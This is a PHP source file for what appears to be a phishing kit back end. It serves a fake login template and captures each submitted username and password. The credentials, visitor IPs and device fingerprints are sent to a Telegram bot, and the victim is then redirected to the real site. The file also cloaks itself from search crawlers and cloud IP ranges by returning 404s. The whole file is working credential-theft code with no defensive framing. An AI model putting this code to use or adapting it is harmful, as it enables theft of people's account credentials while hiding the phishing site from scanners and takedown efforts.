<?php

require __DIR__ . '/vendor/autoload.php';
// error_reporting(E_ALL);
// ini_set('display_errors', 1);

// Configuration
$targetUrl = "https://example.com";
$token = ""; // Telegram token
$chatid = ""; // Telegram chatID
$sendTelegramNotifications = true;
$logDir = __DIR__ . '/logs';
$ipLogFile = $logDir . '/ip_log.jsonl';
$pageVisitsLog = $logDir . '/page_visits.jsonl';
$invalidRoutesLog = $logDir . '/invalid_routes.jsonl';
$blockedIpsLog = $logDir . '/blocked_ips.jsonl';
$blockListFile = $logDir . '/block_list.jsonl'; // Block list file
$maxAttempts = 5;
$timeFrame = 60;
$blockDuration = 600; // 10 minutes

date_default_timezone_set('Europe/Amsterdam');

session_start();
// Session timeout configuration (30 minutes)
$sessionTimeout = 30 * 60;

// Check and set session creation time and ID
if (!isset($_SESSION['created']) || !isset($_SESSION['session_id'])) {
    $_SESSION['created'] = time();
    $_SESSION['session_id'] = bin2hex(random_bytes(16)); // Generate new session ID
}

// Check if session has expired
if (time() - $_SESSION['created'] > $sessionTimeout) {
    session_unset();    // Clear session variables
    session_destroy();  // Destroy the session
    session_start();    // Start a new session
    $_SESSION['session_id'] = bin2hex(random_bytes(16)); // Generate new session ID
    $_SESSION['created'] = time(); // Set new creation time
} else {
    // Refresh session creation time on activity
    $_SESSION['created'] = time();
}
$sessionId = $_SESSION['session_id'];

if (!isset($_SERVER['HTTPS']) || $_SERVER['HTTPS'] !== 'on') {
    header("Location: https://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
    exit;
}

header("Strict-Transport-Security: max-age=31536000; includeSubDomains; preload");
header("Access-Control-Allow-Origin: *");
header("X-XSS-Protection: 1; mode=block");
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");

$requestUri = explode('?', $_SERVER['REQUEST_URI'])[0];

if ($requestUri === '/robots.txt') {
    header('Content-Type: text/plain');
    echo "User-agent: *\nDisallow: /";
    exit;
}

// Function to get IP address
function getRealIpAddr() {
    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    return filter_var($ip, FILTER_VALIDATE_IP) ? $ip : '0.0.0.0';
}

// Function to detect detailed device and browser info using WhichBrowser
function detectDeviceInfo($userAgent) {
    $parser = new WhichBrowser\Parser($userAgent);
    $os = $parser->os->toString();
    $device = $parser->device->toString();
    $browser = $parser->browser->toString();
    return "$os, $device, Browser: $browser";
}

// Function to check if IP is in range
function ipInRange($ip, $range) {
    list($range, $netmask) = explode('/', $range);
    $ipDecimal = ip2long($ip);
    $rangeDecimal = ip2long($range);
    $netmaskDecimal = ~ (pow(2, (32 - $netmask)) - 1);
    return (($ipDecimal & $netmaskDecimal) == ($rangeDecimal & $netmaskDecimal));
}

// Function to send message to Telegram with retry mechanism
function sendToTelegram($message) {
    global $token, $chatid, $sendTelegramNotifications;
    if ($sendTelegramNotifications) {
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid . "&text=" . urlencode($message);
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $attempts = 0;
        $maxAttempts = 3;
        do {
            $result = curl_exec($ch);
            $attempts++;
            if ($result === false && $attempts < $maxAttempts) {
                sleep(1);
            }
        } while ($result === false && $attempts < $maxAttempts);
        curl_close($ch);
    }
}

$userAgent = htmlspecialchars($_SERVER['HTTP_USER_AGENT'], ENT_QUOTES, 'UTF-8');
$crawlerAgents = [
    'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
    'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver',
    'MJ12bot', 'AhrefsBot', 'SemrushBot', 'DotBot', 'SeznamBot',
    'PetalBot', 'AspiegelBot', 'MegaIndex.ru', 'BLEXBot', 'ZoominfoBot',
    'SiteExplorer', 'CCBot', 'Qwantify', 'Screaming Frog', 'UptimeRobot',
    'magpie-crawler', 'YisouSpider', 'linkdexbot', 'Serpstatbot', 'Crawl',
    'AdsBot-Google', 'Mediapartners-Google', 'Twitterbot', 'Pinterestbot', 'LinkedInBot'
];
foreach ($crawlerAgents as $agent) {
    if (stripos($userAgent, $agent) !== false) {
        $ip = getRealIpAddr();
        $jsonData = json_encode([
            'event' => 'Blocked crawler',
            'name' => $agent,
            'ip' => $ip,
            'user_agent' => $userAgent,
            'time' => date('Y-m-d H:i:s')
        ]) . "\n";
        file_put_contents($blockedIpsLog, $jsonData, FILE_APPEND | LOCK_EX);
        sendToTelegram("🚫 Blocked Crawler\n\nName: $agent\nIP: $ip\nUser Agent: $userAgent\nTime: " . date('Y-m-d H:i:s'));
        http_response_code(404);
        echo "404 Not Found";
        exit;
    }
}

$blockedIpRanges = [
    '66.249.64.0/19',   // Googlebot primary range
    '64.233.160.0/19',  // Googlebot additional range
    '157.55.39.0/24',   // Bingbot primary range
    '40.77.167.0/24',   // Bingbot additional range
    '100.43.80.0/20',   // YandexBot primary range
    '180.76.15.0/24',   // Baiduspider range
    '5.255.231.0/24',   // YandexBot additional range
    '77.88.8.0/21',     // YandexBot extra range
    '216.239.32.0/19',  // Google services (e.g., crawlers, APIs)
    '104.196.0.0/14',   // Google Cloud Platform
    '34.64.0.0/10',     // Google Cloud additional range
    '17.0.0.0/8',       // Apple services (some crawlers)
    '54.0.0.0/9'        // Amazon AWS (potential bot hosting)
];
$ip = getRealIpAddr();
foreach ($blockedIpRanges as $range) {
    if (ipInRange($ip, $range)) {
        $jsonData = json_encode([
            'event' => 'Blocked ip',
            'range' => $range,
            'ip' => $ip,
            'time' => date('Y-m-d H:i:s')
        ]) . "\n";
        file_put_contents($blockedIpsLog, $jsonData, FILE_APPEND | LOCK_EX);
        sendToTelegram("🚫 Blocked IP\n\nRange: $range\nIP: $ip\nTime: " . date('Y-m-d H:i:s'));
        http_response_code(404);
        echo "404 Not Found";
        exit;
    }
}

// Check if IP is already blocked
$currentTime = time();
$blocked = false;
if (file_exists($blockListFile)) {
    $blockList = file($blockListFile, FILE_IGNORE_NEW_LINES);
    foreach ($blockList as $line) {
        $entry = json_decode($line, true);
        if (isset($entry['ip']) && $entry['ip'] === $ip && isset($entry['expiration']) && $entry['expiration'] > $currentTime) {
            $blocked = true;
            break;
        }
    }
}
if ($blocked) {
    http_response_code(404);
    echo "404 Not Found";
    exit;
}

// Log the IP request
$ipData = json_encode([
    'ip' => $ip,
    'time' => $currentTime
]) . "\n";
file_put_contents($ipLogFile, $ipData, FILE_APPEND | LOCK_EX);

// Rate limit check
$ipLog = file($ipLogFile, FILE_IGNORE_NEW_LINES);
$attempts = 0;
foreach ($ipLog as $log) {
    $entry = json_decode($log, true);
    if ($entry['ip'] === $ip && ($currentTime - $entry['time']) < $timeFrame) {
        $attempts++;
    }
}
if ($attempts >= $maxAttempts) {
    // Add to block list
    $blockEntry = json_encode([
        'ip' => $ip,
        'expiration' => $currentTime + $blockDuration
    ]) . "\n";
    file_put_contents($blockListFile, $blockEntry, FILE_APPEND | LOCK_EX);
    // Log the event
    $jsonData = json_encode([
        'event' => 'Rate limit exceeded',
        'ip' => $ip,
        'attempts' => $attempts,
        'time' => date('Y-m-d H:i:s')
    ]) . "\n";
    file_put_contents($blockedIpsLog, $jsonData, FILE_APPEND | LOCK_EX);
    // Send Telegram notification
    sendToTelegram("⏳ Rate limit exceeded\n\nIP: $ip\nAttempts: $attempts\nTime: " . date('Y-m-d H:i:s'));
    // Return 404 instead of 429
    http_response_code(404);
    echo "404 Not Found";
    exit;
}

switch ($requestUri) {
    case '/':
        header("Location: $targetUrl");
        exit;

    case '/login':
        $ip = getRealIpAddr();
        $userAgent = htmlspecialchars($_SERVER['HTTP_USER_AGENT'], ENT_QUOTES, 'UTF-8');
        $deviceInfo = detectDeviceInfo($userAgent);
        $method = $_SERVER['REQUEST_METHOD'];
        $jsonData = json_encode([
            'event' => 'Login page opened',
            'session_id' => $sessionId,
            'ip' => $ip,
            'user_agent' => $userAgent,
            'device' => $deviceInfo,
            'method' => $method,
            'url' => $_SERVER['REQUEST_URI'],
            'time' => date('Y-m-d H:i:s')
        ]) . "\n";
        sendToTelegram("📄 Login page opened\n\nSession ID: $sessionId\nIP: $ip\nUser Agent: $userAgent\nDevice: $deviceInfo\nMethod: $method\nURL: " . $_SERVER['REQUEST_URI'] . "\nTime: " . date('Y-m-d H:i:s'));
        file_put_contents($pageVisitsLog, $jsonData, FILE_APPEND | LOCK_EX);
    
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $ip = getRealIpAddr();
            $userAgent = htmlspecialchars($_SERVER['HTTP_USER_AGENT'], ENT_QUOTES, 'UTF-8');
            $deviceInfo = detectDeviceInfo($userAgent);
            $email = htmlspecialchars($_POST['username'] ?? '', ENT_QUOTES, 'UTF-8');
            $password = htmlspecialchars($_POST['password'] ?? '', ENT_QUOTES, 'UTF-8');
            $referer = $_SERVER['HTTP_REFERER'] ?? 'Unknown';
    
            $jsonData = json_encode([
                'event' => 'New login',
                'session_id' => $sessionId,
                'ip' => $ip,
                'user_agent' => $userAgent,
                'device' => $deviceInfo,
                'email' => $email,
                'password' => $password,
                'referer' => $referer,
                'time' => date('Y-m-d H:i:s')
            ]) . "\n";
            sendToTelegram("🔒 NEW LOGIN\n\nSession ID: $sessionId\nIP: $ip\nUser Agent: $userAgent\nDevice: $deviceInfo\nEmail: $email\nPassword: $password\nReferer: $referer\nTime: " . date('Y-m-d H:i:s'));
            file_put_contents($pageVisitsLog, $jsonData, FILE_APPEND | LOCK_EX);
    
            header("Location: $targetUrl");
            exit;
        } else {
            if (file_exists('templates/login.html')) {
                include 'templates/login.html';
            } else {
                http_response_code(404);
                echo "404 Not Found - Login template missing";
                exit;
            }
        }
        break;

    default:
        $ip = getRealIpAddr();
        $userAgent = htmlspecialchars($_SERVER['HTTP_USER_AGENT'], ENT_QUOTES, 'UTF-8');
        $deviceInfo = detectDeviceInfo($userAgent);
        $jsonData = json_encode([
            'event' => 'Invalid route',
            'session_id' => $sessionId,
            'ip' => $ip,
            'device' => $deviceInfo,
            'url' => $_SERVER['REQUEST_URI'],
            'time' => date('Y-m-d H:i:s')
        ]) . "\n";
        file_put_contents($invalidRoutesLog, $jsonData, FILE_APPEND | LOCK_EX);
        http_response_code(404);
        echo "404 Not Found";
        exit;
}
